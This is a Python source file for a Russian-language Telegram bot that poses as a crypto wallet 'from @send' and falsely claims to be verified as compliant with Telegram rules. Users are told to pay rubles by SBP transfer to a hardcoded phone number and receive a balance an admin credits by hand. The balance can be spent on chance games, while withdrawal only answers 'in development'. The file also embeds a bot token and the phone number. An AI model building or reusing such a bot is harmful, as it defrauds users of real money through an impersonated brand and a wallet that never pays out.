import os, sys, time, random, telebot
from telebot import types
try: import telebot
except ImportError:
    import subprocess; subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI"])
    import telebot

bot = telebot.TeleBot('8908913545:AAFqVtBWMZNTrJQKGJxDPyi3wsSHC9iv77Y')
ADMIN_ID = 8455479648; SBP_PHONE = "+79228305663"; CUR = 95.00
BAL, ST = {}, {}

def get_b(u): return 999999999.0 if u == ADMIN_ID else BAL.get(u, 0.0)
def ch_b(u, a):
    if u != ADMIN_ID: BAL[u] = max(0.0, round(BAL.get(u, 0.0) + a, 2))

M_MAIN = lambda n: f"👋 <b>Здравствуй, {n}!</b> Ты попал в крипто-бота от <b>@send</b>.\n\n🛡️ <i>Бот проверен и не нарушает правил Telegram.</i>"

def get_kb():
    m = types.InlineKeyboardMarkup(row_width=2)
    m.add(types.InlineKeyboardButton("💎 Мой Кошелёк", callback_data="w"), types.InlineKeyboardButton("🤝 P2P Маркет", callback_data="p"))
    m.add(types.InlineKeyboardButton("🕹️ Игровой Центр", callback_data="g"), types.InlineKeyboardButton("⚙️ Настройки", callback_data="s"))
    return m

@bot.message_handler(commands=['mani'])
def mani(m):
    if m.from_user.id != ADMIN_ID: return
    a = float(m.text.split()[1]) if len(m.text.split()) > 1 else 50000.0
    bot.reply_to(m, f"💰 <b>Владелец!</b> Начислено <code>{a:,.2f} USD</code>.", parse_mode='HTML')

@bot.message_handler(commands=['start'])
def start(m): ST.pop(m.from_user.id, None); bot.send_message(m.chat.id, M_MAIN(m.from_user.first_name or "Друг"), parse_mode='HTML', reply_markup=get_kb())

@bot.message_handler(func=lambda m: ST.get(m.from_user.id) == "usd")
def inp(m):
    uid = m.from_user.id; ST.pop(uid, None)
    try: amt = float(m.text.replace(',', '.')); assert amt > 0
    except: bot.reply_to(m, "❌ Ошибка ввода числа."); return
    rb = round(amt * CUR, 2)
    txt = f"💳 <b>Пополнение</b>\n━━━━━━━━━━\n💵 Купить: <code>{amt:.2f} USD</code>\n💰 <b>К оплате:</b> <code>{rb:,.2f} RUB</code>\n\n📌 Переведите строго <b>{rb} RUB</b> по СБП на номер <code>{SBP_PHONE}</code>."
    kb = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("📥 Я оплатил(а)", callback_data=f"c_{uid}_{amt}_{rb}")).add(types.InlineKeyboardButton("❌ Отмена", callback_data="w"))
    bot.send_message(m.chat.id, txt, parse_mode='HTML', reply_markup=kb)

@bot.callback_query_handler(func=lambda c: True)
def menu(c):
    u, cid, mid = c.from_user.id, c.message.chat.id, c.message.message_id
    if c.data == "main_menu": bot.edit_message_text(M_MAIN(c.from_user.first_name or "Друг"), cid, mid, parse_mode='HTML', reply_markup=get_kb())
    elif c.data == "w":
        b_str = "<b>∞ USD</b>" if u == ADMIN_ID else f"<code>{get_b(u):.2f} USD</code>"
        t = f"💎 <b>Ваш Кошелёк</b>\n━━━━━━━━━━\n💵 Баланс: {b_str}\n\n📊 КУРСЫ:\n💎 TON: `$5.42` | 🪙 BTC: `$64,250`"
        m = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("➕ Пополнить (RUB)", callback_data="buy"), types.InlineKeyboardButton("📤 Вывести", callback_data="st")).add(types.InlineKeyboardButton("⬅️ Меню", callback_data="main_menu"))
        bot.edit_message_text(t, cid, mid, parse_mode='HTML', reply_markup=m)
    elif c.data == "buy":
        ST[u] = "usd"; bot.edit_message_text(f"✍️ <b>Напишите количество USD</b>, которое хотите купить (курс {CUR} RUB):", cid, mid, parse_mode='HTML', reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("❌ Отмена", callback_data="w")))
    elif c.data.startswith("c_"):
        _, cl, us, rb = c.data.split('_'); bot.delete_message(cid, mid); bot.send_message(cid, "⏳ Заявка отправлена админу на проверку.")
        m = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("✅ Начислить", callback_data=f"a_{cl}_{us}"), types.InlineKeyboardButton("❌ Отклонить", callback_data=f"d_{cl}"))
        bot.send_message(ADMIN_ID, f"🔔 Заявка СБП!\n💵 Ожидается: <b>{rb} RUB</b>\n💎 Начислить: <b>{us} USD</b>\n👤 От: ID {cl}", reply_markup=m)
    elif c.data.startswith("a_"):
        _, cl, us = c.data.split('_'); ch_b(int(cl), float(us)); bot.edit_message_text(c.message.text + "\n\n🟢 Одобрено!", cid, mid)
        try: bot.send_message(int(cl), f"🎉 Баланс пополнен на <code>{float(us):.2f} USD</code> через СБП!")
        except: pass
    elif c.data.startswith("d_"):
        cl = c.data.split('_')[1]; bot.edit_message_text(c.message.text + "\n\n🔴 Отклонено!", cid, mid)
        try: bot.send_message(int(cl), "❌ Ваша заявка отклонена администратором.")
        except: pass
    elif c.data == "p": bot.edit_message_text("🤝 *P2P*\n━━━━━━━━━━\n📌 *Объявления:* _пусто\\._", cid, mid, parse_mode='MarkdownV2', reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ Меню", callback_data="main_menu")))
    elif c.data == "g":
        t = f"🕹️ <b>Игровой Центр</b>\n━━━━━━━━━━\n💵 Баланс: <code>{'∞' if u==ADMIN_ID else f'{get_b(u):.2f}'} USD</code>\n🎰 Игра стоит 10 USD:"
        m = types.InlineKeyboardMarkup(row_width=2).add(types.InlineKeyboardButton("🚀 Ракетка", callback_data="gr"), types.InlineKeyboardButton("🏀 Баскетбол", callback_data="gb"), types.InlineKeyboardButton("⚽ Футбол", callback_data="gf"), types.InlineKeyboardButton("🎯 Дротики", callback_data="gd")).add(types.InlineKeyboardButton("⬅️ Меню", callback_data="main_menu"))
        bot.edit_message_text(t, cid, mid, parse_mode='HTML', reply_markup=m)
    elif c.data in ["gr", "r_fly"]:
        if u != ADMIN_ID and get_b(u) < 10: bot.answer_callback_query(c.id, "❌ Мало денег!", True); return
        if c.data == "r_fly":
            ch_b(u, -10.0); cp = round(random.uniform(0.5, 4.5), 2)
            for s in [1.00, round(cp*0.5, 2)]:
                if s < cp: bot.edit_message_text(f"🚀 Множитель: <code>{s}x</code>", cid, mid, parse_mode='HTML'); time.sleep(0.4)
            if cp >= 1.0: ch_b(u, round(10*cp, 2)); txt = f"🎉 Выигрыш! Раунд: <code>{cp}x</code>"
            else: txt = f"💥 Краш! Отметка: <code>{cp}x</code> (-10 USD)"
        else: txt = "🚀 Ракетка (10 USD)\nЖми старт!"
        bot.edit_message_text(txt, cid, mid, parse_mode='HTML', reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🛫 ЗАПУСК", callback_data="r_fly")).add(types.InlineKeyboardButton("⬅️ Назад", callback_data="g")))
    elif c.data in ["gb", "gf", "gd"]:
        if u != ADMIN_ID and get_b(u) < 10: bot.answer_callback_query(c.id, "❌ Мало денег!", True); return
        bot.delete_message(cid, mid); ch_b(u, -10.0); em = {"gb":"🏀","gf":"⚽","gd":"🎯"}[c.data]; res = bot.send_dice(cid, emoji=em); time.sleep(2.5); v = res.dice.value
        w = (em=="🏀" and v>3) or (em=="⚽" and v>2) or (em=="🎯" and v==6)
        if w: ch_b(u, 25.0); txt = "🎉 ПОПАДАНИЕ! +25 USD"
        else: txt = "❌ ПРОМАХ! -10 USD"
        bot.send_message(cid, f"{txt}\n🎯 Очки: `{v}`", parse_mode='HTML', reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔄 Еще раз", callback_data=c.data), types.InlineKeyboardButton("⬅️ Игры", callback_data="g")))
    elif c.data == "s": bot.edit_message_text("⚙️ <b>Настройки</b>\n━━━━━━━━━━\n🌐 Ру / USD", cid, mid, parse_mode='HTML', reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ Меню", callback_data="main_menu")))
    elif c.data == "st": bot.answer_callback_query(c.id, "⚡ В разработке", True)

if __name__ == '__main__':
    try: bot.remove_webhook()
    except: pass
    time.sleep(2.0); bot.infinity_polling(skip_pending=True)
